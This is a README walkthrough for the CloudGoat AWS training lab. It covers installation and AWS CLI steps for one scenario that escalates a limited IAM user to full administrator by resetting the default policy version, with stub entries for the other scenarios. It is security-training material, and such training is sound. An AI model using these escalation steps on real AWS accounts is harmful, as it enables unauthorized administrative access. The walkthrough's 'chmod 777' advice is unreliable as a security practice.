# cloud-goat_walkthrough
Short Cloud Goat 2.0 Walkthrough with AWS CLI  
This walkthrough only consists of this readme file  

CloudGoat was written by RhinoSecurityLabs. More information can be found here:  
(https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/)

Github's Official CloudGoat link can be found here:  
(https://github.com/RhinoSecurityLabs/cloudgoat)

## Installation
Cloud goat can be installed via Docker, but this guide only covers the AWS installation of CloudGoat.  
This requires a free tier Amazon AWS account. RhinoLabs states that this training may cost $1-3 per day.  
While I cannot guarantee this to be free, I have yet to accrue any costs while using CloudGoat.  
  
Create an aws profile to use for cloudgoat, this example uses the profile **goat**.  
To install CloudGoat, several steps are required as pre-requisites.    
Installation for Windows systems is not included at this time, but detailed installation steps will be included for both Linux and OSX. Leave me feedback requesting this, and I'll get it working on Windows for you.  
  
### Linux
1. Verify python3.6+ is installed  

### OSX
MacOS High Sierra and Mojave both come with Python3.6+   
1. Verify python3.6+ is installed from Terminal  
`python3` will launch the installed version of python 3 which it will list on the 1st line  
CTRL+D to quit   
2. Install terraform   
`brew install terraform`  
3. Verify terraform installation   
`terraform`   
4. Install AWS CLI  
`brew install awscli`   
5. Change the directory to a good location for CloudGoat *~/* seems to work best for a least priv option  
6. Install CloudGoat  
```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
sudo chmod u+x cloudgoat.py
sudo chmod 777 cloudgoat.py
```   
The github documentation states to use pip3 install -r requirements.txt, but I have found that isn't actually necessary.  
7. Create a profile   
`./cloudgoat.py config profile`   
    * Default profile name? __y__     
    * Default AWS profile: __goat__   
8. Configure your system's IP to be on the whitelist   
`./cloudgoat.py config whitelist --auto`   
Now that the installation of the cloudgoat python module is complete, move on to create/remove the scenarios in order.  
9. Create the **goat** profile for AWS CLI
`aws configure --profile goat`   
    * AWS Access Key ID: __goat account aws_access_key_id__   
    * AWS Secret Access Key: __goat aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __can be left blank__    
    

## iam_privesc_by_rollback
This scenario starts with limited user credentials and escalates to admin privileges by rolling back an iam policy version.  
1. Create scenario  
`./cloudgoat.py create iam_privesc_by_rollback --profile goat`  
2. Document all Outputs information  
e.g.  
   * cloudgoat_output_aws_account_id =  
   * cloudgoat_output_raynor_access_key_id =  
   * cloudgoat_output_raynor_secret_key =  
3. Create the profile for Raynor, the user you need to privesc as  
`aws configure --profile raynor`  
    * AWS Access Key ID: __raynor account aws_access_key_id__   
    * AWS Secret Access Key: __raynor aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __leave blank__ 
4. List the user policies for Raynor  
`aws iam list-attached-user-policies --user-name raynor --profile raynor`  
5. Document the PolicyArn Value
6. List the versions for the discovered user policy   
`aws iam list-policy-versions --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --profile raynor`   
7. Get information on the policy for all versions
`aws iam get-policy-version --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --version-id v1 --profile raynor`
8. Document the policy version which contains __Allowed Actions:*__ and __Resource:*__  
This demonstrates administrative privileges by allowed all actions to be performed on all resources
9. Set the default policy version to the one containing admin privileges 
aws iam set-default-policy-version --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --version-id v3 --profile Raynor  
10. Verify account authorization details are administrative
`aws iam get-account-authorization-details --profile raynor`
This list will be a bit accessive as the account now has all possible privileges 

### Destroy iam_privesc_by_rollback
There's no reason to leave an overly permissive account lying around. 
1. Clean up this scenario with the **destroy** command
`cloudgoat.py destroy all --profile raynor`
2. Remove the created profile
`vim ~/.aws/credentials`   
Type `dd` beside each line to be removed  
Then `:wq` to write and quit  

## iam_privesc_by_attachment
1. Create scenario  
`./cloudgoat.py create iam_privesc_by_attachment --profile goat`  


## cloud_breach_s3
1. Create scenario  
`./cloudgoat.py create cloud_breach_s3 --profile goat`  


## ec2_ssrf
1. Create scenario  
`./cloudgoat.py create ec2_ssrf --profile goat`  


## rce_web_app
1. Create scenario   
`./cloudgoat.py create rce_web_app --profile goat`   


## codebuild_secrets
1. Create scenario  
`./cloudgoat.py create codebuild_secrets --profile goat`  

## Removal
### iam_privesc_by_rollback
